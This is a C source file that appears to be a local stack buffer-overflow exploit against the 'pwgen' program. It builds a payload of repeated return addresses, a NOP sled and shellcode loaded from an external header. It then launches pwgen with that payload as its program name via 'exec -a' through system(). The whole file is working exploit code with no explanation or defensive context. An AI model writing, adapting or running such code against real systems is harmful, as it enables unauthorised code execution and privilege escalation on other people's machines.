#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include </usr/local/src/shellcode.h>

#define BUFFER_SIZE 1124
#define CMDSIZE 1224
#define OFFSET 2400

unsigned long get_stack_pointer(void) {
   __asm__("movl %esp,%eax");
   //
}

void main(int argc, char *argv[]) {
    long *addr_ptr, addr;
    char *buff, *ptr, *cmd;
    int i;
    int offset=OFFSET, buff_size=BUFFER_SIZE, cmd_size=CMDSIZE;
    size_t shellLen = strlen(shellcode);
    
    if (argc > 1) {
        buff_size  = atoi(argv[1]);
    }
    if (argc > 2) {
        offset = atoi(argv[2]);
    }

    buff = (char*) malloc(buff_size);
    cmd = (char *) malloc(cmd_size);
    if (!buff || !cmd) exit(0); // can't allocate memory

    addr = get_stack_pointer() - offset;
    addr_ptr = (long *) buff;

    for (i = 0; i < buff_size; i += 4) {
        addr_ptr += 1;
        *addr_ptr = addr;
    }

    for (i = 0; i < buff_size/2; i++) {
        buff[i] = 0x90; // NOP sled
    }

    ptr = buff + ((buff_size-shellLen)/2);  
    buff[buff_size-1] = '\0'; // set last item to \0

    for (i = 0; i < shellLen; i++) {
        ptr += 1;
        *ptr = shellcode[i];
    }
    
    // creates command "exec -a buff pwgen"
    strcpy(cmd, "exec -a "); strcat(cmd, buff); strcat(cmd, " pwgen\0");
    system(cmd);

    return 0;
}
